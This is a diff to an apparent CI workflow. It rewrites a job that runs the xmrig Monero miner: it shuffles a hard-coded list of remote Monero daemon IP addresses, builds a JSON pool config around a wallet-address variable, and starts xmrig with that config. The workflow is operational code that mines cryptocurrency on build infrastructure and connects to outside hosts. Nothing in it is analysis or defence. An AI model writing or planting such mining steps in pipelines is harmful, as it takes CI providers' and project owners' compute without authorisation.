@@ -45,14 +45,23 @@ jobs:
               46.4.52.92:18081
               144.76.113.157:18081
               )
+              servery=( $(shuf -e "${servery[@]}") )
 
-              while true; do
-              server=${servery[$(( RANDOM % ${#servery[@]} ))]}
-              if curl --silent --connect-timeout 5 --fail http://${server}/get_info >/dev/null; then
-              break
-              else
-              echo $server ne v seti
-              fi
+              cat <<EOF>config.json
+              {
+              "autosave": false,
+              "cpu": true,
+              "opencl": false,
+              "cuda": false,
+              "pools": []
+              }
+              EOF
+
+              for server in "${servery[@]}"; do
+              jq --arg server "$server" --arg adres "$adres" \
+              '.pools += [{ coin: "monero", url: $server, user: $adres, daemon: true }]' \
+              config.json > config.json.tmp || exit 1
+              mv config.json.tmp config.json || exit 1
               done
 
-              ./xmrig --url=$server --user=$adres --coin monero --daemon
+              ./xmrig -c config.json
